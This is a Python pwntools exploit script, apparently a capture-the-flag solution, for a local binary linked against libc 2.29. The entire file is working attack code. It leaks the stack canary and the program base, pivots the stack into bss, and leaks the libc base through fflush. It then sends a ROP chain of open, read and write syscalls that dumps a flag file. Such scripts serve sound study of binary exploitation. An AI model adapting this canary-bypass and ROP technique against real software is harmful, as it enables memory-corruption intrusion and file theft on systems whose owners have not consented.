from pwn import *

p = process('./S', env={'LD_PRELOAD':'./libc-2.29.so'})
libc = ELF('./libc-2.29.so')

# leak process base address and canary
p.sendafter('name : ', 'a'*25)
p.recvuntil('a'*24)
canary = u64(p.recv(8)) - ord('a')
base = u64(p.recvline().strip().ljust(8, b'\x00')) - 0x12f0
success('canary = 0x%x', canary)
success('base address = 0x%x', base)

# overwrite return address to main
main = base + 0x1235
bss = base + 0x4d00
payload = b'a'*24 + p64(canary) + p64(bss) + p64(main)
p.sendafter('here : ', payload)

# run once to make libc address on bss
p.sendafter('name : ', 'a')
payload = b'a'*24 + p64(canary) + p64(bss) + p64(main)
pause()
p.sendafter('here : ', payload)

# leak libc
p.sendafter('name : ', 'a'*8)
p.recvuntil('a'*8)
fflush = u64(p.recvline().strip().ljust(8, b'\x00')) - 157
libc_base = fflush - libc.sym['fflush']
success('libc base = 0x%x', libc_base)
payload = b'a'*24 + p64(canary) + p64(bss) + p64(main)
p.sendafter('here : ', payload)

# overwrite return address to gets
pop_rdi = 0x1353 + base
leave_ret = 0x12e1 + base
gets = libc_base + libc.sym['gets']
p.sendafter('name : ', 'a')
payload = p64(pop_rdi) + p64(bss-0x8) + p64(gets) + p64(canary) + p64(bss-0x28) + p64(leave_ret)
p.sendafter('here : ', payload)

# rop chain
pop_rsi = 0x26f9e + libc_base
pop_rdx = 0x12bda6 + libc_base
pop_rax = 0x47cf8 + libc_base
syscall_ret = 0xcf6c5 + libc_base   # ROPgaget with parameter --multibr
payload = p64(pop_rdi) + p64(bss+0x8*26) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall_ret) # open
payload += p64(pop_rdi) + p64(3) + p64(pop_rsi) + p64(bss+0x100) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(0) + p64(syscall_ret) # read
payload += p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss+0x100) + p64(pop_rdx) + p64(0x100) + p64(pop_rax) + p64(1) + p64(syscall_ret) # write
payload += b'/home/opp556687/flag'
pause()
p.sendline(payload)

p.interactive()